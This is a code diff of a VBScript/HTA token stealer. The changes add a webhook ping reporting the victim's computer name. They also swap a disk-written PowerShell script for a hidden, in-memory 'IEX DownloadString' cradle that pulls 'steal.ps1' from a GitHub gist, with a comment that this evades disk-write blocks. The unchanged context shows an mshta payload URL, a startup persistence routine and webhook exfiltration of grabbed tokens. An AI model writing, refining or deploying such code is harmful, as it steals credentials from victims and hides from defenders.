@@ -18,6 +18,9 @@ PAYLOAD_URL = "mshta https://dicerigx.app/"
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
+' --- DEBUG PING ---
+Call PostEmbedTo("Debug", "Script successfully started | PC: " & PC, 3447003, RE_WH)
+
 ' --- Initial Grab ---
 Call GrabTokens
 Call IP
@@ -195,7 +198,7 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "Startup installed to boot HTA", 65280)
 End Sub
 
-' --- GrabTokens (gist pull — strip if unwanted) ---
+' --- GrabTokens (gist pull — in memory) ---
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -205,13 +208,15 @@ Sub GrabTokens()
     Dim pc: pc = xh.responseText
     If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
-    Dim psf: psf = TmpFile("steal.ps1")
-    WriteFile psf, pc
-    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
-    fso.DeleteFile psf, True
+    
+    ' Run entirely in memory (bypasses disk-write blocks)
+    Dim cmd : cmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""IEX ((New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/iveshahaha/bb5e511a627ff1ce80ccc4839153f901/raw/steal.ps1'))"""
+    sh.Run cmd, 0, True
+    
     Dim tf: tf = TmpFile("steal_result.txt")
     If Not fso.FileExists(tf) Then Exit Sub
     Dim raw: raw = ReadFile(tf)
+    
     If Len(raw) > 10 Then
         Dim lines: lines = Split(raw, vbCrLf)
         Dim l
